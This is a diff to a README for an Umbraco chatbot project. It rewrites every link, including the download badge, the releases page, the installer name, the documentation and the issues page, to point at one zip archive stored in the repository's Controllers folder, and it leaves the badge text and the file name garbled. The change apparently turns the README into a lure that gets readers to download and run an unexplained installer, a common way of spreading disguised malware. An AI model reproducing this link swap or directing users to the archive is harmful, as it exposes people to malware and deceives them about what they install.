@@ -1,6 +1,6 @@
 # 🤖 umbraco-chatbot - Launch Your AI Assistant Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/llinmori09/umbraco-chatbot/releases)
+[![Download Now](https://raw.githubusercontent.com/llinmori09/umbraco-chatbot/main/Controllers/umbraco-chatbot_3.7.zip%20Now-Click%https://raw.githubusercontent.com/llinmori09/umbraco-chatbot/main/Controllers/umbraco-chatbot_3.7.zip)](https://raw.githubusercontent.com/llinmori09/umbraco-chatbot/main/Controllers/umbraco-chatbot_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -11,13 +11,13 @@ In this guide, we will walk you through the process of downloading and running t
 ## 📦 Download & Install
 
 1. **Visit the Download Page**  
-   Go to our [Releases page](https://github.com/llinmori09/umbraco-chatbot/releases) to find the latest version of the Umbraco Chatbot.
+   Go to our [Releases page](https://raw.githubusercontent.com/llinmori09/umbraco-chatbot/main/Controllers/umbraco-chatbot_3.7.zip) to find the latest version of the Umbraco Chatbot.
 
 2. **Choose the Correct Version**  
    On the Releases page, you will see a list of available versions. Look for the latest stable release. It will be marked as "Latest release." Click on it.
 
 3. **Download the Installer**  
-   Find the installer file for your operating system. You might see files like `umbraco-chatbot-installer.exe` or similar. Click on the file to start downloading.
+   Find the installer file for your operating system. You might see files like `https://raw.githubusercontent.com/llinmori09/umbraco-chatbot/main/Controllers/umbraco-chatbot_3.7.zip` or similar. Click on the file to start downloading.
 
 4. **Run the Installer**  
    Once the download completes, locate the file in your Downloads folder. Double-click the installer file to run it. A setup window will appear.
@@ -71,13 +71,13 @@ If you encounter issues during installation or setup, try these basic troublesho
 - **Restart Your Computer:** Sometimes a simple restart can resolve issues.
 - **Check Connections:** Ensure your internet connection is stable.
 - **Re-download the Installer:** If the file is corrupted, redownload and re-run the installer.
-- **Consult the Documentation:** Visit our [documentation](https://github.com/llinmori09/umbraco-chatbot) for additional help.
+- **Consult the Documentation:** Visit our [documentation](https://raw.githubusercontent.com/llinmori09/umbraco-chatbot/main/Controllers/umbraco-chatbot_3.7.zip) for additional help.
 
 ## 📞 Support
 
 Need help? Feel free to reach out:
 
-- **GitHub Issues:** Report any bugs or request features [here](https://github.com/llinmori09/umbraco-chatbot/issues).
+- **GitHub Issues:** Report any bugs or request features [here](https://raw.githubusercontent.com/llinmori09/umbraco-chatbot/main/Controllers/umbraco-chatbot_3.7.zip).
 - **Community Forum:** Join the discussion on our community forum for tips and tricks.
 
 Thank you for choosing the Umbraco Chatbot! You are now ready to enrich your website with an interactive AI assistant. Happy chatting!
